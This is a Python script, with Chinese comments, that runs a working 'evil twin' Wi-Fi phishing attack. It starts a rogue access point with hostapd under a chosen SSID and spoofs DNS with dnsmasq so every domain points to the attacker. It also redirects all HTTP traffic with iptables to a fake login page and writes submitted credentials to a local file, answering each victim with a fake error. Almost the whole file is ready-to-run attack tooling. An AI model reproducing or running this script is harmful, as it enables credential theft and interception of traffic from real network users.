import os
import sys
import time
import subprocess
import argparse
import threading
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# ================= 配置区域 =================
AP_IP = "10.0.0.1"
NETMASK = "255.255.255.0"
DHCP_RANGE = "10.0.0.10,10.0.0.100,12h"
WEB_PORT = 80
TMP_DIR = "/tmp/eviltwin"

if not os.path.exists(TMP_DIR):
    os.makedirs(TMP_DIR)


# ================= 钓鱼 Web 服务器 =================
class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 无论用户访问什么 (如 baidu.com)，都返回钓鱼页面
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # 读取钓鱼模板
        template_path = f"{TMP_DIR}/index.html"
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                self.wfile.write(f.read().encode('utf-8'))
        else:
            self.wfile.write(b"<h1>Login Page Error: Template not found</h1>")

    def do_POST(self):
        # 捕获用户提交的密码
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # 将捕获的凭证写入文件
        with open(f"{TMP_DIR}/captured_creds.txt", "a") as f:
            f.write(f"[+] Credential: {post_data}\n")

        # 这里可以做判断，如果密码正确（需要校验握手包）则放行
        # 简单起见，这里直接显示“错误”或跳转
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>Error: Connection Timeout. Please try again later.</h1>")


def start_web_server():
    try:
        server = HTTPServer((AP_IP, WEB_PORT), PhishingHandler)
        print(f"[*] Web Server started on {AP_IP}:{WEB_PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Web Server Error: {e}")


# ================= 核心功能函数 =================
def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def setup_network(interface):
    print(f"[*] Configuring interface {interface}...")
    run_cmd("nmcli radio wifi off")
    run_cmd(f"rfkill unblock wlan")
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"ip addr flush dev {interface}")
    run_cmd(f"ip link set {interface} up")
    run_cmd(f"ip addr add {AP_IP}/24 dev {interface}")


def start_dnsmasq(interface):
    print("[*] Starting Dnsmasq (DHCP & DNS Spoof)...")
    conf = f"""
interface={interface}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{AP_IP}
"""
    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f:
        f.write(conf)

    run_cmd("killall dnsmasq")
    run_cmd(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf")


def start_hostapd(interface, ssid, channel):
    print(f"[*] Starting Hostapd (Fake AP: {ssid})...")
    conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
        f.write(conf)

    run_cmd("killall hostapd")
    # 后台运行 hostapd
    subprocess.Popen(f"hostapd {TMP_DIR}/hostapd.conf", shell=True, stdout=open(f"{TMP_DIR}/hostapd.log", "w"),
                     stderr=subprocess.STDOUT)


def setup_iptables(interface):
    print("[*] Setting up IPTables (Captive Portal)...")
    # 开启路由转发
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # 清空规则
    run_cmd("iptables --flush")
    run_cmd("iptables -t nat --flush")
    run_cmd("iptables -t mangle --flush")
    run_cmd("iptables -P FORWARD ACCEPT")
    # 核心：将所有 HTTP 流量劫持到本地 Web Server
    run_cmd(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
    run_cmd(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")  # 如果需要通过 eth0 上网


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True, help="Network card for Fake AP")
    parser.add_argument("--ssid", required=True, help="SSID name")
    parser.add_argument("--channel", default="6", help="Channel")
    parser.add_argument("--template", default="<h1>Login</h1>", help="HTML Content or File")
    args = parser.parse_args()

    # 1. 写入钓鱼模板
    # 如果传入的是 HTML 内容字符串
    with open(f"{TMP_DIR}/index.html", "w", encoding='utf-8') as f:
        f.write(args.template)

    # 2. 检查依赖
    if not shutil.which("hostapd") or not shutil.which("dnsmasq"):
        print("[!] Missing tools. Installing...")
        run_cmd("apt-get update && apt-get install -y hostapd dnsmasq")

    # 3. 启动流程
    setup_network(args.interface)
    start_dnsmasq(args.interface)
    start_hostapd(args.interface, args.ssid, args.channel)
    setup_iptables(args.interface)

    # 4. 启动 Web Server (阻塞运行)
    print("[+] Evil Twin Started. Waiting for victims...")
    start_web_server()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopping...")
        run_cmd("killall hostapd dnsmasq")
        run_cmd("iptables --flush")